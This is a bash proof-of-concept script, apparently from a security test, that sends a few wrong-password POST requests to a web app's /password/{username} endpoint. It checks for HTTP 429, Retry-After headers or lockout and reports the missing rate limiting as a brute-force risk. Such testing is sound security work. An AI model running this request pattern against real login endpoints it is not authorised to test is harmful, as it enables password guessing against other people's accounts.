#!/bin/bash

# POC: No Rate Limiting or Account Lockout on Authentication
# This script demonstrates that the /password/{username} endpoint lacks
# rate limiting and continues to accept repeated authentication attempts
# without throttling, delays, or account lockout.

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8082}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"
USERNAME="test"
NUM_ATTEMPTS=5

echo "[*] No Rate Limiting on Authentication Endpoint POC"
echo "[*] Target: ${TARGET_URL}"
echo "[*] Testing endpoint: /password/${USERNAME}"
echo "[*] Performing ${NUM_ATTEMPTS} failed authentication attempts..."
echo ""

# First, access the password reset form to get the user_id
echo "[*] Step 1: Fetching password reset form..."
FORM_RESPONSE=$(curl -s -i "${TARGET_URL}/password/${USERNAME}" 2>/dev/null)
HTTP_CODE=$(echo "$FORM_RESPONSE" | head -1 | grep -oP '\d{3}')
FORM_BODY=$(echo "$FORM_RESPONSE" | tail -n +2)

if [ "$HTTP_CODE" != "200" ]; then
    echo "[!] Failed to fetch password form. HTTP Status: $HTTP_CODE"
    exit 1
fi

# Extract user_id from the form
USER_ID=$(echo "$FORM_BODY" | grep -oP 'name="user_id"[^>]*value="\K[0-9]+' | head -1)

echo "[+] Form retrieved successfully (HTTP $HTTP_CODE)"
if [ -n "$USER_ID" ]; then
    echo "[+] Extracted user_id: $USER_ID"
fi
echo ""

# Now perform multiple failed authentication attempts
echo "[*] Step 2: Submitting ${NUM_ATTEMPTS} failed authentication attempts..."
echo "---"

rate_limit_detected=0
all_http_codes=""

for i in $(seq 1 $NUM_ATTEMPTS); do
    # Use incorrect password for each attempt
    INCORRECT_PASSWORD="wrongpassword${i}"
    
    # Capture full response including headers
    RESPONSE=$(curl -s -i -X POST \
        "${TARGET_URL}/password/${USERNAME}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "user_id=${USER_ID:-}&password=${INCORRECT_PASSWORD}" \
        2>/dev/null)
    
    # Extract HTTP code from response
    HTTP_CODE=$(echo "$RESPONSE" | head -1 | grep -oP '\d{3}')
    RESPONSE_BODY=$(echo "$RESPONSE" | tail -n +2)
    
    all_http_codes="${all_http_codes}${HTTP_CODE} "
    
    # Check if response contains rate limiting indicators
    if [ "$HTTP_CODE" = "429" ]; then
        echo "[!] RATE LIMITING DETECTED: HTTP 429 on attempt $i"
        rate_limit_detected=1
        break
    fi
    
    # Check for Retry-After header (rate limiting indicator)
    if echo "$RESPONSE" | grep -qi "^Retry-After:"; then
        echo "[!] RATE LIMITING DETECTED: Retry-After header present on attempt $i"
        rate_limit_detected=1
    fi
    
    # Check for rate limiting messages in response
    if echo "$RESPONSE_BODY" | grep -qi "too many\|rate limit\|locked\|suspended\|try again"; then
        echo "[!] RATE LIMITING DETECTED: Rate limit message in response on attempt $i"
        rate_limit_detected=1
    fi
    
    echo "Attempt $i: HTTP $HTTP_CODE | Password: ${INCORRECT_PASSWORD}"
    
    # Small delay between attempts to simulate rapid requests (but should be throttled by server)
    sleep 0.05
done

echo "---"
echo ""
echo "[*] Step 3: Analysis of Results"
echo "---"

# Check if all responses were HTTP 200 or 302 (indicating no rate limiting)
echo "[*] HTTP response codes: $all_http_codes"

if [ $rate_limit_detected -eq 0 ]; then
    echo "[!] VULNERABILITY CONFIRMED: No rate limiting detected"
    echo "[!] All attempts were accepted without HTTP 429 responses"
    echo "[!] No rate limiting headers (Retry-After) detected"
    echo "[!] No rate limiting messages in responses"
fi

echo ""
echo "[*] Step 4: Testing for account lockout..."
echo "---"

# Try one more attempt to see if account gets locked
RESPONSE=$(curl -s -i -X POST \
    "${TARGET_URL}/password/${USERNAME}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "user_id=${USER_ID:-}&password=anothertest" \
    2>/dev/null)

FINAL_HTTP_CODE=$(echo "$RESPONSE" | head -1 | grep -oP '\d{3}')
FINAL_RESPONSE_BODY=$(echo "$RESPONSE" | tail -n +2)

if [ "$FINAL_HTTP_CODE" = "200" ] || [ "$FINAL_HTTP_CODE" = "302" ]; then
    echo "[!] VULNERABILITY CONFIRMED: No account lockout after multiple failed attempts"
    echo "[!] Additional attempt also accepted (HTTP $FINAL_HTTP_CODE)"
    echo "[!] Account remains accessible for brute force attacks"
else
    echo "[+] Account lockout detected (HTTP $FINAL_HTTP_CODE)"
fi

echo ""
echo "[*] Step 5: Vulnerability Summary"
echo "---"
echo "[!] VULNERABILITY: No Rate Limiting on Authentication"
echo "    - Multiple failed attempts accepted without throttling"
echo "    - No HTTP 429 (Too Many Requests) responses"
echo "    - No account lockout mechanism"
echo "    - No exponential backoff delays"
echo "[!] Brute Force Risk:"
echo "    - Attackers can submit unlimited password guesses"
echo "    - Combined with user enumeration, enables efficient targeted attacks"
echo "    - Dictionary-based attacks could discover weak passwords"
echo ""